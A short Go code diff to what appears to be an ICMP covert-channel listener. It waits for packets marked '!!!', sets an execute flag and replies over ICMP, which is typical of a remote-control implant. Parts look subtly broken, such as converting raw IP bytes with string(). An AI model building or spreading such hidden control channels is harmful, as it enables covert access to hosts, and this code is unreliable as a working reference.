@@ -127,20 +127,30 @@ func sniffer(c icmp.PacketConn) {
 		header := payload[0:7]
 		if strings.HasPrefix(header, "!!!") {
 			payload = payload[7:]
-			fmt.Print((payload))
+			fmt.Println("Recieved", payload)
 			response := "Got it"
 			PACKETQUEUE = make([]icmp.Message, (len(response)/1460)+1)
 			execute = true
 			generate_packet(response, 0)
 			if DEBUG {
-				fmt.Print("[DEBUG] ", response)
+				fmt.Println("[SENDING]", response)
 			}
 
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
 			ip, _ := ipLayer.(*layers.IPv4)
-			send_packets(string(ip.DstIP), c) // Need server address
+			fmt.Println("[FROM]", ip.DstIP)
+			go sender(string(ip.DstIP))
 		}
 	}
+}
+
+func sender(dst string) {
+	var SendAddr = dst
+	d, err := icmp.ListenPacket("ip4:icmp", SendAddr)
+	if err != nil {
+		fmt.Println(err)
+	}
+	send_packets(dst, *d) // Need server address
 }
 
 func convert(nums []byte) string {
